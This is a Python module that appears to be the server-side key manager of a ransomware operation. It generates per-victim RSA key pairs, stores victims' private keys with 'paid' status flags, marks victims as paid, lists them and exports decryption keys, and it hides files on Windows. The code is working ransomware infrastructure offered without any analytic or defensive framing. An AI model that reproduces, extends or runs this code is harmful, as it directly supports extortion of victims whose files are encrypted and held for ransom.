import os
import json
import time
import hashlib
import secrets
import stat


try:
    #Cryptodome
    from Cryptodome.PublicKey import RSA
    CRYPTO_LIB = "cryptodome"
except ImportError:
    try:
        # cryptography
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.backends import default_backend
        CRYPTO_LIB = "cryptography"
    except ImportError:
        raise ImportError("Install either: pip install pycryptodome OR pip install cryptography")

KEYS_FOLDER = "keys"

def setup():
    if not os.path.exists(KEYS_FOLDER):
        try:
            os.makedirs(KEYS_FOLDER, exist_ok=True)
           
            if os.name == 'posix':
                os.chmod(KEYS_FOLDER, stat.S_IRWXU) 
        except Exception as e:
            raise Exception(f"Cannot create keys folder: {e}")

def make_key():
    try:
        if CRYPTO_LIB == "cryptodome":
            key = RSA.generate(4096)
            private_key = key.export_key()
            public_key = key.publickey().export_key()
            return private_key, public_key
        else:  # cryptography
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=4096,
                backend=default_backend()
            )
            public_key = private_key.public_key()
            
            private_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
            
            public_pem = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            
            return private_pem, public_pem
    except Exception as e:
        raise Exception(f"Key generation failed: {e}")

def make_server_key():
    setup()
    
    private_path = f"{KEYS_FOLDER}/server_private.pem"
    public_path = f"{KEYS_FOLDER}/server_public.pem"
    
    if os.path.exists(private_path) and os.path.exists(public_path):
        with open(public_path, "rb") as f:
            return f.read()
    
    private, public = make_key()
    
    try:
        with open(private_path, "wb") as f:
            f.write(private)
        with open(public_path, "wb") as f:
            f.write(public)
        
        secure_file(private_path)
        secure_file(public_path)
        
        return public
    except Exception as e:
        raise Exception(f"Cannot save server keys: {e}")

def make_victim_key(victim_id):
    setup()
    
    victim_file = f"{KEYS_FOLDER}/victim_{victim_id}.json"
    if os.path.exists(victim_file):
        with open(victim_file, "r", encoding='utf-8') as f:
            data = json.load(f)
        return data["public_key"].encode('utf-8')
    
    private, public = make_key()
    
    key_data = {
        "victim_id": victim_id,
        "private_key": private.decode('utf-8'),
        "public_key": public.decode('utf-8'),
        "created": time.time(),
        "paid": False,
        "paid_time": None
    }
    
    try:
        with open(victim_file, "w", encoding='utf-8') as f:
            json.dump(key_data, f, indent=2)
        
        secure_file(victim_file)
        return public
    except Exception as e:
        raise Exception(f"Cannot save victim key: {e}")

def get_key(victim_id, key_type="private"):
    filename = f"{KEYS_FOLDER}/victim_{victim_id}.json"
    
    if not os.path.exists(filename):
        return None
    
    try:
        with open(filename, "r", encoding='utf-8') as f:
            data = json.load(f)
        
        if key_type == "private":
            return data["private_key"].encode('utf-8')
        else:
            return data["public_key"].encode('utf-8')
    except Exception as e:
        print(f"Error reading key: {e}")
        return None

def mark_paid(victim_id):
    filename = f"{KEYS_FOLDER}/victim_{victim_id}.json"
    
    if not os.path.exists(filename):
        return False
    
    try:
        with open(filename, "r", encoding='utf-8') as f:
            data = json.load(f)
        
        data["paid"] = True
        data["paid_time"] = time.time()
        
        with open(filename, "w", encoding='utf-8') as f:
            json.dump(data, f, indent=2)
        
        return True
    except Exception as e:
        print(f"Error marking as paid: {e}")
        return False

def list_victims():
    if not os.path.exists(KEYS_FOLDER):
        return []
    
    victims = []
    for file in os.listdir(KEYS_FOLDER):
        if file.startswith("victim_") and file.endswith(".json"):
            victim_id = file[7:-5]
            
            try:
                with open(f"{KEYS_FOLDER}/{file}", "r", encoding='utf-8') as f:
                    data = json.load(f)
                
                victims.append({
                    "id": victim_id,
                    "created": data.get("created", 0),
                    "paid": data.get("paid", False),
                    "paid_time": data.get("paid_time")
                })
            except Exception:
                continue
    
    return victims

def export_key(victim_id):
    private_key = get_key(victim_id, "private")
    if not private_key:
        return False
    
    export_folder = "exported_keys"
    try:
        os.makedirs(export_folder, exist_ok=True)
    except Exception as e:
        print(f"Error creating export folder: {e}")
        return False
    
    filename = f"{export_folder}/{victim_id}_key.pem"
    try:
        with open(filename, "wb") as f:
            f.write(private_key)
        
        secure_file(filename)
        return True
    except Exception as e:
        print(f"Error exporting key: {e}")
        return False

def make_victim_id(ip="0.0.0.0"):
    unique_text = f"{ip}_{time.time()}_{secrets.randbelow(1000000)}_{os.urandom(8).hex()}"
    victim_id = hashlib.sha256(unique_text.encode()).hexdigest()[:16]
    return victim_id

def secure_file(filepath):
    try:
        if os.name == 'posix':  # Linux/Mac
            os.chmod(filepath, stat.S_IRUSR | stat.S_IWUSR)  
        elif os.name == 'nt':  # Windows
            try:
             
                os.system(f'attrib +h "{filepath}"')
            except:
                pass  
        return True
    except:
        return False

def auto_setup():
    setup()
    make_server_key()

